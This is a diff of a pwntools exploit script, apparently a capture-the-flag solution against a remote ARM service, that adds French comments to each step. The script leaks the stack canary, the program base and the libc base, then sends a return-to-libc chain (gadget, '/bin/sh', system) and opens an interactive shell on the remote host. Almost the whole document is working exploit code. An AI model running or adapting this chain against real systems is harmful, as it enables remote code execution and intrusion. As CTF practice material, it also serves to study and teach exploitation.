@@ -5,29 +5,33 @@ libc = ELF("./libc.so.6")
 
 io = remote('94.237.53.219', 58914)
 
-io.sendline(b"A" * 0x21)
-io.recvuntil(b"A" * 0x21)
-canary = u32(io.recv(3).rjust(4, b"\0"))
+# Leak Canary
+io.sendline(b"A" * 0x21)           # Remplit jusqu'au canary
+io.recvuntil(b"A" * 0x21)          # Attend d'arriver au canary
+canary = u32(io.recv(3).rjust(4, b"\0"))  # Le canary se termine par 0x00
 
-io.sendline(b"A" * 0x30)
+io.sendline(b"A" * 0x30)           # Offset pour leak adrr de retour
 io.recvuntil(b"A" * 0x30)
 exe.address = u32(io.recv(4).ljust(4, b'\0')) - (exe.sym["main"] + 108)
 
-io.sendline(b"A" * 0x48)
+# Leak base Libc (ASLR)
+io.sendline(b"A" * 0x48)           # Offset pour leak addr libc
 io.recvuntil(b"A" * 0x48)
 libc_leak = u32(io.recv(4).rjust(4, b'\0'))
-libc.address = libc_leak - 0x1748C - 0x99
+libc.address = libc_leak - 0x1748C - 0x99  # Offset spécifique à cette libc
 
-gadget = libc.address + 0x0005bebc
+# Gadget : pop {r0, r4, pc}
+gadget = libc.address + 0x0005bebc  # r0 = arg pour system()
 
-payload = b"quit"
-payload += b"A" * (32 - 4)
-payload += p32(canary)
-payload += b"A" * 0xc
-payload += p32(gadget)
-payload += p32(next(libc.search(b"/bin/sh")))
-payload += p32(0xdeadbeef)
-payload += p32(libc.sym["system"])
+# Payload
+payload = b"quit"                  # pour éviter crash
+payload += b"A" * (32 - 4)         # Padding jusqu'au canary
+payload += p32(canary)             # Canary Restauré
+payload += b"A" * 0xc              # Padding jusqu'au saved PC
+payload += p32(gadget)             # Gadget: pop {r0, r4, pc}
+payload += p32(next(libc.search(b"/bin/sh")))  # r0 = "/bin/sh" (arg system)
+payload += p32(0xdeadbeef)         # r4 = valeur quelconque
+payload += p32(libc.sym["system"]) # pc = system() - exécute le shell
 
 io.sendline(payload)
-io.interactive()
+io.interactive()  # Obtient un shell
